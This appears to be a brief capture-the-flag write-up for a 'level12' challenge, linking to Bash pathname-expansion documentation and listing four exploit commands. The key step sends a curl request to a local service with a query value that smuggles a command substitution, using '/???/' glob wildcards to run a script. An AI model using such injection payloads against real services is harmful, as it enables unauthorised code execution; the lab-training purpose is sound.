### Documentation
[Pathname expension](https://datacadamia.com/lang/bash/pathname_expansion)

### External
```
Bash    GETFLAG
```

### Exploit
1. `./send level12 ./level12/Ressources/GETFLAG`

2. `cp GETFLAG /tmp`

3. `curl 'localhost:4646?x=$(/???/GETFLAG)'`

4. `cat /tmp/flag`